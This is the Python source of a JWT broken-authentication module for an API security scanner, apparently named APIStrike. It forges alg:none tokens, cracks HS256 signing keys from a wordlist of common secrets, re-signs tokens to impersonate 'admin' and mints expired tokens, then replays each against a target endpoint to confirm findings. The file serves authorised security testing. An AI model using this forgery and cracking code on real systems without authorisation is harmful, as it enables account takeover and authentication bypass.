"""Broken Authentication (OWASP API2:2023) checks for APIStrike.

This is the first real *attack* module. It takes a known-good JWT captured by
the AuthEngine and probes whether the target actually enforces JWT integrity:

  1. alg:none      -- strip the signature and claim the token is unsigned.
  2. weak secret   -- brute-force the HS256 signing key from a small wordlist,
                      which (if found) lets us forge ANY user, including admin.
  3. expiry        -- forge a token whose ``exp`` is in the past and see if the
                      target still accepts it.

Design rules honoured here:
  * No module talks to httpx directly. Every request goes through the injected
    ScopedHTTPClient, so scope + rate limiting always apply.
  * Every finding is evidence-driven: a vulnerability is only recorded after a
    live request confirms the forged/tampered token was accepted.
    "AI advises, the engine confirms."
  * All crypto is Python standard library (hmac/hashlib/base64) -- no PyJWT
    dependency -- so the logic is trivially unit-testable offline.

Nothing here is destructive: it performs read-only GETs against a probe
endpoint using tokens minted locally. Use only against systems you are
authorised to test.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from typing import Iterable, List, Optional

from apistrike.auth.auth_engine import _b64url_decode, decode_jwt
from apistrike.core.findings import Finding
from apistrike.modules.jwt_advanced import run_advanced_jwt_checks

# A deliberately small, fast wordlist of secrets common in tutorials,
# boilerplate, and CTF targets. Real engagements can pass a larger list.
DEFAULT_SECRETS: tuple = (
    "secret", "secret123", "secretkey", "secret_key", "password", "passw0rd",
    "changeme", "admin", "administrator", "root", "test", "testing", "key",
    "jwt", "jwt_secret", "jwtsecret", "supersecret", "super_secret",
    "your-256-bit-secret", "your_jwt_secret", "mysecret", "my_secret_key",
    "s3cr3t", "qwerty", "123456", "1234567890", "letmein", "hello",
    "vampi", "flask", "django", "default", "example", "insecure",
)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")


def _split(token: str) -> tuple:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a well-formed JWT (expected 3 dot-separated parts).")
    return parts[0], parts[1], parts[2]


def _encode_segment(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    return _b64url_encode(raw)


def hs256_signature(signing_input: bytes, secret: str) -> str:
    """Compute the base64url HS256 signature for ``header.payload``."""
    digest = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return _b64url_encode(digest)


def crack_hs256_secret(token: str, secrets: Iterable[str] = DEFAULT_SECRETS) -> Optional[str]:
    """Return the signing secret if any candidate reproduces the signature.

    Only meaningful for HS256 tokens. Returns None if nothing matches.
    """
    header_raw, payload_raw, signature = _split(token)
    try:
        header = decode_jwt(token)["header"]
    except ValueError:
        return None
    if str(header.get("alg", "")).upper() != "HS256":
        return None
    signing_input = f"{header_raw}.{payload_raw}".encode("utf-8")
    for secret in secrets:
        candidate = hs256_signature(signing_input, secret)
        if hmac.compare_digest(candidate, signature):
            return secret
    return None


def forge_alg_none(token: str, variants: Iterable[str] = ("none", "None", "NONE", "nOnE")) -> List[str]:
    """Produce alg:none variants of ``token`` with an empty signature."""
    header_raw, payload_raw, _sig = _split(token)
    header = json.loads(_b64url_decode(header_raw))
    forged: List[str] = []
    for v in variants:
        h = dict(header)
        h["alg"] = v
        forged.append(f"{_encode_segment(h)}.{payload_raw}.")
    return forged


def resign_hs256(token: str, secret: str, claim_updates: Optional[dict] = None) -> str:
    """Re-sign a token with ``secret`` (HS256), optionally patching claims.

    Used to (a) forge another user's identity once the secret is known and
    (b) mint an intentionally-expired token for the expiry test.
    """
    header_raw, payload_raw, _sig = _split(token)
    header = json.loads(_b64url_decode(header_raw))
    payload = json.loads(_b64url_decode(payload_raw))
    header["alg"] = "HS256"
    if claim_updates:
        payload.update(claim_updates)
    h_raw = _encode_segment(header)
    p_raw = _encode_segment(payload)
    signing_input = f"{h_raw}.{p_raw}".encode("utf-8")
    return f"{h_raw}.{p_raw}.{hs256_signature(signing_input, secret)}"


@dataclass
class BrokenAuthResult:
    findings: List[Finding] = field(default_factory=list)
    cracked_secret: Optional[str] = None
    alg_none_accepted: bool = False
    expired_accepted: bool = False
    forged_identity_accepted: bool = False
    notes: List[str] = field(default_factory=list)


class BrokenAuthModule:
    """Live broken-authentication checks against a single probe endpoint.

    Parameters
    ----------
    client : injected ScopedHTTPClient (must expose ``async get(url, **kwargs)``)
    base_url : target base, e.g. "http://localhost:5000"
    valid_token : a known-good token captured by the AuthEngine
    probe_path : an endpoint that REQUIRES authentication (default "/me")
    secrets : iterable of candidate HS256 secrets
    """

    OWASP_ID = "API2:2023"

    def __init__(self, client, base_url: str, valid_token: str,
                 probe_path: str = "/me", secrets: Iterable[str] = DEFAULT_SECRETS):
        if not valid_token:
            raise ValueError("BrokenAuthModule needs a known-good token to compare against.")
        self.client = client
        self.base_url = base_url.rstrip("/")
        self.valid_token = valid_token
        self.probe_path = probe_path if probe_path.startswith("/") else "/" + probe_path
        self.secrets = tuple(secrets)
        self.public_key_pem = getattr(self, 'public_key_pem', None)
        self.jwks_url = getattr(self, 'jwks_url', None)
        self.status_valid: Optional[int] = None
        self.status_unauth: Optional[int] = None

    @property
    def probe_url(self) -> str:
        return f"{self.base_url}{self.probe_path}"

    async def _probe(self, token: Optional[str]):
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        return await self.client.get(self.probe_url, headers=headers)

    def _authorized(self, status: int) -> bool:
        """A forged token is 'accepted' if it behaves like the valid one."""
        if self.status_valid is None:
            return False
        return status == self.status_valid and status < 400

    async def _establish_baseline(self, result: BrokenAuthResult) -> bool:
        ev_valid = await self._probe(self.valid_token)
        ev_unauth = await self._probe(None)
        self.status_valid = ev_valid.status_code
        self.status_unauth = ev_unauth.status_code
        result.notes.append(
            f"baseline: valid-token -> HTTP {self.status_valid}, "
            f"no-token -> HTTP {self.status_unauth} at {self.probe_path}"
        )
        if self.status_valid >= 400:
            result.notes.append(
                "Valid token did not yield a success response; probe endpoint may be wrong. "
                "Skipping live tamper checks (offline secret check still runs)."
            )
            return False
        if self.status_valid == self.status_unauth:
            result.notes.append(
                "Probe endpoint does not distinguish authenticated vs anonymous; "
                "it may not require auth. Skipping live tamper checks."
            )
            return False
        return True

    def _evidence(self, check: str, token: str, status: int, extra: Optional[dict] = None) -> dict:
        ev = {
            "check": check,
            "url": self.probe_url,
            "status": status,
            "baseline_valid_status": self.status_valid,
            "baseline_unauth_status": self.status_unauth,
            "token_preview": token[:48] + ("..." if len(token) > 48 else ""),
        }
        if extra:
            ev.update(extra)
        return ev

    async def _check_alg_none(self, result: BrokenAuthResult, live: bool) -> None:
        if not live:
            return
        for forged in forge_alg_none(self.valid_token):
            ev = await self._probe(forged)
            if self._authorized(ev.status_code):
                result.alg_none_accepted = True
                alg = json.loads(_b64url_decode(forged.split(".")[0])).get("alg")
                result.findings.append(Finding(
                    title="JWT 'alg:none' signature bypass accepted",
                    severity="critical",
                    owasp_id=self.OWASP_ID,
                    endpoint=self.probe_path,
                    cwe="CWE-347",
                    confidence="confirmed",
                    description=(
                        "The target accepted a JSON Web Token whose header declared "
                        f"alg={alg!r} and carried an empty signature. The server does not "
                        "verify the token signature, so an attacker can mint tokens for any "
                        "user (including administrators) without knowing any secret."
                    ),
                    recommendation=(
                        "Reject tokens whose 'alg' is 'none'. Pin the accepted algorithm "
                        "explicitly (e.g. algorithms=['HS256']) and always verify the "
                        "signature server-side."
                    ),
                    evidence=[self._evidence("alg:none", forged, ev.status_code, {"alg": alg})],
                ))
                return

    async def _check_weak_secret(self, result: BrokenAuthResult, live: bool) -> None:
        secret = crack_hs256_secret(self.valid_token, self.secrets)
        if not secret:
            result.notes.append(
                f"HS256 secret not found in the {len(self.secrets)}-word list "
                "(or token is not HS256)."
            )
            return
        result.cracked_secret = secret
        evidence = [{
            "check": "weak_secret",
            "algorithm": "HS256",
            "cracked_secret": secret,
            "wordlist_size": len(self.secrets),
        }]
        # If live, prove impact by forging a different identity and replaying it.
        if live:
            claims = decode_jwt(self.valid_token)["payload"]
            forged_claims = dict(claims)
            for key in ("sub", "username", "user", "name"):
                if key in forged_claims:
                    forged_claims[key] = "admin"
            forged_claims.setdefault("sub", "admin")
            forged = resign_hs256(self.valid_token, secret, forged_claims)
            ev = await self._probe(forged)
            if self._authorized(ev.status_code):
                result.forged_identity_accepted = True
            evidence.append(self._evidence(
                "forged_identity", forged, ev.status_code,
                {"forged_claims": forged_claims, "accepted": self._authorized(ev.status_code)},
            ))
        result.findings.append(Finding(
            title=f"JWT signed with a weak, guessable secret ({secret!r})",
            severity="critical",
            owasp_id=self.OWASP_ID,
            endpoint=self.probe_path,
            cwe="CWE-798",
            confidence="confirmed",
            description=(
                "The HS256 signing key was recovered from a small dictionary of common "
                f"secrets ({secret!r}). Anyone who guesses this key can forge valid tokens "
                "for arbitrary users, fully bypassing authentication and authorization."
                + (" A forged token impersonating 'admin' was accepted by the target."
                   if result.forged_identity_accepted else "")
            ),
            recommendation=(
                "Use a long, high-entropy random signing key (>=256 bits) loaded from a "
                "secret manager or environment, never a dictionary word or code constant. "
                "Rotate the key and invalidate existing tokens."
            ),
            evidence=evidence,
        ))

    async def _check_expiry(self, result: BrokenAuthResult, live: bool) -> None:
        if not live or not result.cracked_secret:
            if live and not result.cracked_secret:
                result.notes.append(
                    "Expiry check skipped: needs the signing secret to mint a validly-"
                    "signed expired token (secret was not cracked)."
                )
            return
        past = int(time.time()) - 3600
        expired = resign_hs256(self.valid_token, result.cracked_secret,
                               {"exp": past, "iat": past - 60})
        ev = await self._probe(expired)
        if self._authorized(ev.status_code):
            result.expired_accepted = True
            result.findings.append(Finding(
                title="Expired JWT still accepted",
                severity="high",
                owasp_id=self.OWASP_ID,
                endpoint=self.probe_path,
                cwe="CWE-613",
                confidence="confirmed",
                description=(
                    "A token whose 'exp' claim is one hour in the past was accepted by the "
                    "target. Expired sessions are not enforced, so stolen or leaked tokens "
                    "remain usable indefinitely."
                ),
                recommendation=(
                    "Validate the 'exp' claim on every request and reject expired tokens. "
                    "Keep token lifetimes short and support revocation."
                ),
                evidence=[self._evidence("expired", expired, ev.status_code, {"exp": past})],
            ))
        else:
            result.notes.append("Expiry appears to be enforced (expired token rejected).")

    async def run(self, store=None) -> BrokenAuthResult:
        """Run all broken-auth checks. If ``store`` is given, persist findings."""
        result = BrokenAuthResult()
        live = await self._establish_baseline(result)
        await self._check_alg_none(result, live)
        await self._check_weak_secret(result, live)
        await self._check_expiry(result, live)
        await run_advanced_jwt_checks(self, result, live)
        if store is not None:
            for finding in result.findings:
                store.add(finding)
        return result
